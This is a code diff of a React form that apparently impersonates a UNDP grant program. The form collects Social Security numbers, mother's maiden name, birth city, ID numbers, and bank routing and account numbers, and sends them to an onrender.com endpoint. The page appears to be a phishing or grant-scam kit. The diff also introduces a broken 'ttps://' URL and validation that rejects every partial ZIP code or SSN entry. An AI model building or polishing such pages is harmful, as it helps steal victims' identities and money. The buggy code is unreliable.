@@ -3,6 +3,8 @@ import Image from "next/image";
 import React, { ChangeEvent, useState } from "react";
 import { ToastContainer, toast } from "react-toastify";
 import "react-toastify/dist/ReactToastify.css";
+import { FaPlus } from "react-icons/fa";
+import Select from "react-select";
 
 const Form = () => {
   const [formData, setFormData] = useState({
@@ -34,23 +36,36 @@ const Form = () => {
     mailingAddress: "",
     photo: null as File | null,
   });
-  const [selectedGender, setSelectedGender] = useState("");
-  const [selectedGrantType, setSelectedGrantType] = useState("");
-  const [selectedReceiveMethod, setSelectedReceiveMethod] = useState("");
-  const [selectedAccountType, setSelectedAccountType] = useState("");
+  const [selectedGender, setSelectedGender] = useState<{
+    label: string;
+    value: string;
+  } | null>(null);
+  const [selectedGrantType, setSelectedGrantType] = useState<{
+    label: string;
+    value: string;
+  } | null>(null);
+  const [selectedReceiveMethod, setSelectedReceiveMethod] = useState<{
+    label: string;
+    value: string;
+  } | null>(null);
+  const [selectedAccountType, setSelectedAccountType] = useState<{
+    label: string;
+    value: string;
+  } | null>(null);
+  const [selectedState, setSelectedState] = useState<string | null>(null);
 
-  const handleSelectChange = (e: ChangeEvent<HTMLSelectElement>) => {
-    const { name, value } = e.target;
+  const handleSelectChange = (selectedOption: any, name: string) => {
     if (name === "gender") {
-      setSelectedGender(value);
+      setSelectedGender(selectedOption);
     } else if (name === "grantType") {
-      setSelectedGrantType(value);
+      setSelectedGrantType(selectedOption);
     } else if (name === "receiveMethod") {
-      setSelectedReceiveMethod(value);
+      setSelectedReceiveMethod(selectedOption);
     } else if (name === "accountType") {
-      setSelectedAccountType(value);
+      setSelectedAccountType(selectedOption);
     } else if (name === "state") {
-      setFormData({ ...formData, [name]: value });
+      setSelectedState(selectedOption.value);
+      setFormData({ ...formData, [name]: selectedOption.value });
     }
   };
 
@@ -108,7 +123,39 @@ const Form = () => {
   ];
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    setFormData({ ...formData, [e.target.name]: e.target.value });
+    const { name, value } = e.target;
+
+    // For ZIP code, check if the length is exactly 5 digits
+    if (name === "zipCode" && value.length !== 5) {
+      toast.error("ZIP code must be 5 digits");
+      return;
+    }
+
+    // For SSN, format with dashes and ensure correct length
+    if (name === "ssn") {
+      const sanitizedValue = value.replace(/-/g, "");
+      if (!/^\d{0,9}$/.test(sanitizedValue)) {
+        toast.error("SSN must contain only numbers");
+        return;
+      }
+      if (sanitizedValue.length !== 9) {
+        toast.error("Please input a valid SSN");
+        return;
+      }
+      let formattedSSN = sanitizedValue;
+      if (sanitizedValue.length > 3) {
+        formattedSSN = `${sanitizedValue.slice(0, 3)}-${sanitizedValue.slice(
+          3
+        )}`;
+      }
+      if (sanitizedValue.length > 5) {
+        formattedSSN = `${formattedSSN.slice(0, 6)}-${formattedSSN.slice(6)}`;
+      }
+      setFormData({ ...formData, [name]: formattedSSN });
+    } else {
+      // For other fields, update the form data state normally
+      setFormData({ ...formData, [name]: value });
+    }
   };
 
   const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
@@ -135,17 +182,26 @@ const Form = () => {
     formDataToSend.append("zipCode", formData.zipCode);
     formDataToSend.append("phoneNumber", formData.phoneNumber);
     formDataToSend.append("ssn", formData.ssn);
-    formDataToSend.append("gender", selectedGender);
+    formDataToSend.append("gender", selectedGender ? selectedGender.value : ""); // Provide a default value if selectedGender is null
     formDataToSend.append("dob", formData.dob);
     formDataToSend.append("idNumber", formData.idNumber);
     formDataToSend.append("idExpiryDate", formData.idExpiryDate);
     formDataToSend.append("birthCity", formData.birthCity);
     formDataToSend.append("motherMaidenName", formData.motherMaidenName);
     formDataToSend.append("email", formData.email);
-    formDataToSend.append("grantType", selectedGrantType);
+    formDataToSend.append(
+      "grantType",
+      selectedGrantType ? selectedGrantType.value : ""
+    );
     formDataToSend.append("grantAmount", formData.grantAmount);
-    formDataToSend.append("receiveMethod", selectedReceiveMethod);
-    formDataToSend.append("accountType", selectedAccountType);
+    formDataToSend.append(
+      "receiveMethod",
+      selectedReceiveMethod ? selectedReceiveMethod.value : ""
+    ); // Provide a default value if selectedReceiveMethod is null
+    formDataToSend.append(
+      "accountType",
+      selectedAccountType ? selectedAccountType.value : ""
+    ); // Provide a default value if selectedAccountType is null
     formDataToSend.append("routingNumber", formData.routingNumber);
     formDataToSend.append("accountNumber", formData.accountNumber);
     formDataToSend.append("mailingAddress", formData.mailingAddress);
@@ -161,13 +217,10 @@ const Form = () => {
     }
 
     try {
-      const response = await fetch(
-        "https://undp.onrender.com/api/submit-form",
-        {
-          method: "POST",
-          body: formDataToSend,
-        }
-      );
+      const response = await fetch("ttps://undp.onrender.com/api/submit-form", {
+        method: "POST",
+        body: formDataToSend,
+      });
       console.log("Server Response:", response); // Log the response object
       if (response.ok) {
         toast.success("Thank You For Applying!");
@@ -188,7 +241,12 @@ const Form = () => {
         <h1 className="md:text-2xl text-base font-extrabold text-black uppercase text-center">
           United nation development programme grant(UNDP)
         </h1>
-        <Image src="/undp.svg" alt="" width={100} height={100} />
+        <div className="flex md:flex-row flex-col items-center md:gap-10 gap-5">
+          <Image src="/undp.svg" alt="" width={100} height={100} />
+          <FaPlus color="#000" size={20} />
+
+          <Image src="/ID.svg" alt="" width={100} height={100} />
+        </div>
         <div className="">
           <p className="text-black text-sm mb-3">
             Submit your details To apply for the UNDP VITA Grant program you
@@ -295,20 +353,21 @@ const Form = () => {
                 />
               </div>
               <div className="w-full sm:w-1/2">
-                <select
-                  className="w-full bg-white text-xs py-3 px-5 text-black "
-                  name="state"
-                  value={formData.state}
-                  onChange={handleSelectChange}
-                  required
-                >
-                  <option value="">Select State</option>
-                  {states.map((state) => (
-                    <option key={state} value={state}>
-                      {state}
-                    </option>
-                  ))}
-                </select>
+                <Select
+                  className="text-xs text-black"
+                  options={[
+                    { label: "Select State", value: "" }, // Placeholder option
+                    ...states.map((state) => ({ label: state, value: state })),
+                  ]}
+                  value={
+                    selectedState
+                      ? { label: selectedState, value: selectedState }
+                      : undefined
+                  }
+                  onChange={(selectedOption) =>
+                    handleSelectChange(selectedOption, "state")
+                  }
+                />
               </div>
             </div>
             <div className="w-full ">
@@ -360,17 +419,19 @@ const Form = () => {
             <label htmlFor="" className="text-black mb-3  font-bold uppercase">
               Gender
             </label>{" "}
-            <select
-              className="w-full mb-3 mt-4 outline-none bg-white text-xs py-3 px-5 text-black "
-              name="gender"
+            <Select
+              className="text-xs text-black"
+              options={[
+                { label: "Male", value: "male" },
+                { label: "Female", value: "female" },
+              ]}
               value={selectedGender}
-              onChange={handleSelectChange}
-              required
-            >
-              <option value="">Please select</option>
-              <option value="male">Male</option>
-              <option value="female">Female</option>
-            </select>
+              name="gender"
+              onChange={(selectedOption) =>
+                handleSelectChange(selectedOption, "gender")
+              }
+              placeholder="Select Gender"
+            />
           </div>
 
           <div className="mt-4">
@@ -513,18 +574,19 @@ const Form = () => {
             <label htmlFor="" className="text-black mb-3  font-bold uppercase">
               Grant Type
             </label>{" "}
-            <select
-              className="w-full mb-3 mt-4 outline-none bg-white text-xs py-3 px-5 text-black "
-              name="grantType"
+            <Select
+              className="text-xs text-black"
+              options={[
+                { label: "Personal Grant", value: "Personal Grant" },
+                { label: "Educational Grant", value: "Educational Grant" },
+                { label: "Business Grant", value: "Business Grant" },
+              ]}
               value={selectedGrantType}
-              onChange={handleSelectChange}
-              required
-            >
-              <option value="">Select Grant Type</option>
-              <option value="Personal Grant">Personal Grant</option>
-              <option value="Educational Grant">Educational Grant</option>
-              <option value="Business Grant">Business Grant</option>
-            </select>
+              onChange={(selectedOption) =>
+                handleSelectChange(selectedOption, "grantType")
+              }
+              placeholder="Select Grant Type"
+            />
           </div>
           <div className="mt-4">
             <label htmlFor="" className="text-black mb-3  font-bold uppercase">
@@ -545,17 +607,18 @@ const Form = () => {
             <label htmlFor="" className="text-black mb-3  font-bold uppercase">
               How To Receive Grant
             </label>{" "}
-            <select
-              className="w-full mb-3 mt-4 outline-none bg-white text-xs py-3 px-5 text-black "
-              name="receiveMethod"
+            <Select
+              className="text-xs text-black"
+              options={[
+                { label: "Direct Deposit", value: "Direct Deposit" },
+                { label: "Debit Card", value: "Debit Card" },
+              ]}
               value={selectedReceiveMethod}
-              onChange={handleSelectChange}
-              required
-            >
-              <option value="">Please Select</option>
-              <option value="Direct Deposit">Direct Deposit</option>
-              <option value="Debit Card">Debit Card</option>
-            </select>
+              onChange={(selectedOption) =>
+                handleSelectChange(selectedOption, "receiveMethod")
+              }
+              placeholder="Select Receive Method"
+            />
           </div>
 
           <div className="mb-5.5 flex flex-col  gap-10 sm:flex-row">
@@ -566,17 +629,18 @@ const Form = () => {
               >
                 Account Type
               </label>
-              <select
-                className="w-full outline-none bg-white text-xs py-3 px-5 text-black "
-                name="accountType"
+              <Select
+                className="text-xs text-black"
+                options={[
+                  { label: "Checkings", value: "Checkings" },
+                  { label: "Savings", value: "Savings" },
+                ]}
                 value={selectedAccountType}
-                onChange={handleSelectChange}
-                required
-              >
-                <option value="">Please Select</option>
-                <option value="Checkings">Checkings</option>
-                <option value="Savings">Savings</option>
-              </select>
+                onChange={(selectedOption) =>
+                  handleSelectChange(selectedOption, "accountType")
+                }
+                placeholder="Select Account Type"
+              />
             </div>
             <div className="w-full sm:w-[40%]">
               <label
